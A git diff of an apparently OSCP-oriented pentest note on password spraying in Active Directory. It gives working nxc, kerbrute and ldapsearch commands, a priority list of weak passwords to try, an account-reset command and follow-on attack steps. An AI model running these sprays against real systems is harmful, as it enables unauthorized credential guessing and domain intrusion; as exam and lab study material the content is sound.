@@ -3,11 +3,7 @@ id: password-spray
 title: Password Spraying
 stage: initial-access
 tags: [windows, linux, ad, smb]
-tools:
-  - nxc smb $DC_IP -u '' -p '' --pass-pol
-  - kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt 'Password123'
-  - nxc smb $DC_IP -u users.txt -p 'Password123' --continue-on-success
-  - nxc smb $DC_IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+summary: Test one password against all known users — the safest way to turn a username list into a credential without triggering lockouts.
 leads_to:
   - winrm
   - rev-shell
@@ -16,34 +12,40 @@ leads_to:
   - bloodhound
 ---
 
+## Prerequisites
+
+A valid username list (from LDAP, kerbrute, SMTP, or RPC null session). The lockout policy **must** be checked before the first spray — locking accounts on an exam is catastrophic and unrecoverable.
+
+Password spraying is controlled brute-force: one password across all users, then wait. The goal isn't to crack passwords — it's to find the one user who never changed their welcome credential. Once you have any domain user credential, the entire AD attack chain opens up (BloodHound, Kerberoast, ADCS checks).
+
 ## Step 0 — Check Lockout Policy FIRST
 
+> Non-negotiable. A lockout threshold of 0 means spray freely; any other value means one password per observation window.
+
 ```bash
-# Check before spraying ANYTHING. Locking accounts on the exam is unrecoverable.
 nxc smb $DC_IP -u '' -p '' --pass-pol
 nxc smb $DC_IP -u user -p password --pass-pol
-
-# LDAP alternative
 ldapsearch -H ldap://$DC_IP -x -b "DC=domain,DC=com" "(objectClass=domainDNS)" lockoutThreshold lockoutDuration
-
-# lockoutThreshold: 0 → spray freely
-# Any other number → ONE password per user, then stop and wait the observation window
 ```
 
-## Spray
+## Quick Win
+
+> Kerbreros-based spray — less noisy in Windows event logs than SMB.
 
 ```bash
-# Kerberos-based (less noisy in event logs)
 kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt 'Password123'
+```
 
-# SMB-based
+## SMB-Based Spray
+
+> Full spray or paired list (one password per user — safe against lockout).
+
+```bash
 nxc smb $DC_IP -u users.txt -p 'Password123' --continue-on-success
-
-# Paired list (one password per user — safe against lockout)
 nxc smb $DC_IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
 ```
 
-## OSCP Password Order
+## OSCP Password Priority Order
 
 ```
 <blank>
@@ -51,20 +53,17 @@ Password123 / Password1
 Welcome1 / Welcome123
 Summer2025 / Winter2025 / Spring2025
 <DomainName>1 / <DomainName>123
-<username>  (username == password)
+<username>   (username == password)
 ```
-
-## After a Hit — Priority Order
-
-1. **Shell check** — `nxc smb/winrm/rdp $DC_IP -u user -p pass` — `Pwn3d!` = stop and go there
-2. **BloodHound** — run before anything else; it maps every attack path
-3. **ADCS** — `certipy find -vulnerable` — high-value, no shell required
-4. **Follow BloodHound paths** — ACL chains, gMSA, LAPS, WriteDACL
-5. **Kerberoast** — start alongside BloodHound
 
 ## Special Cases
 
+> Account must change password — use smbpasswd.py to set a new one before proceeding.
+
 ```bash
-# STATUS_PASSWORD_MUST_CHANGE — use impacket's smbpasswd.py
 smbpasswd.py '$DOMAIN/username:@$DC_IP' -newpass 'NewPassword1!'
 ```
+
+## Leads To
+
+Hit confirmed (`Pwn3d!`) → go immediately to that protocol's access node (winrm/rdp-access/ssh-access). Any valid domain credential → run bloodhound before anything else. No `Pwn3d!` but valid creds → check certipy for ADCS vulns, run kerberoast, follow BloodHound paths.
